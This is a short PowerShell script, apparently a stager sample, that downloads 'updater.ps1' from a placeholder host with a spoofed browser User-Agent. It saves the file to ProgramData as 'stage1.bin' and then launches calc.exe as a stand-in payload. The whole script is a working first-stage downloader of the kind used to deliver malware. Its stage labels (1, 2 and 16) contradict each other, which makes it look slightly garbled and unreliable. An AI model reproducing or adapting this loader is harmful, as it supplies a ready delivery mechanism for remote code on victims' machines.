
$Stage1Url = 'https://contoso.com/updater.ps1'
$OutputPath = 'C:\ProgramData\stage1.bin'
$StageTimeout = 160
$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$FetchResult = Invoke-PayloadFetch -SourceUrl $Stage1Url -DestinationPath $OutputPath -TimeoutSec $StageTimeout -UserAgent $UserAgent
if ($FetchResult) {
    Start-Process -FilePath "calc.exe"
}

$ProgressPreference = "SilentlyContinue"
Write-Output "stage 16 initialized"
